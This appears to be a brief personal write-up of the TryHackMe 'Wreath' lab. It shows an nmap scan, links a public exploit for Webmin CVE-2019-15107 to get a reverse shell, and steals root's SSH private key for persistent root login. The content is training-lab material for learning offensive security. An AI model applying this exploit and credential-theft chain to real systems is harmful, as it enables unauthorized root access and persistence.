link: https://tryhackme.com/room/wreath
<code><h2>Enumaration Webserver </h2>
nmap
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ nmap -sV -sC -Pn 10.200.85.200
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-24 05:31 CST
Nmap scan report for 10.200.85.200
Host is up (0.53s latency).
Not shown: 920 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-01-24T10:54:15
|_Not valid after:  2025-01-23T10:54:15
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds

<b>Service Webmin is vulnarable</b>
link: https://github.com/MuirlandOracle/CVE-2019-15107

use exploid to get reverse shell
download /root/.ssh/id_rsa to get pernament access via ssh

┌──(duke㉿kali) [~/Documents/THM_Wreath]
└─$ cp id_rsa root                        
┌──(duke㉿kali) -[~/Documents/THM_Wreath]
└─$ chmod +600 root 
┌──(duke㉿kali) [~/Documents/THM_Wreath]
└─$ ssh -i root root@10.200.85.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# 


</code>

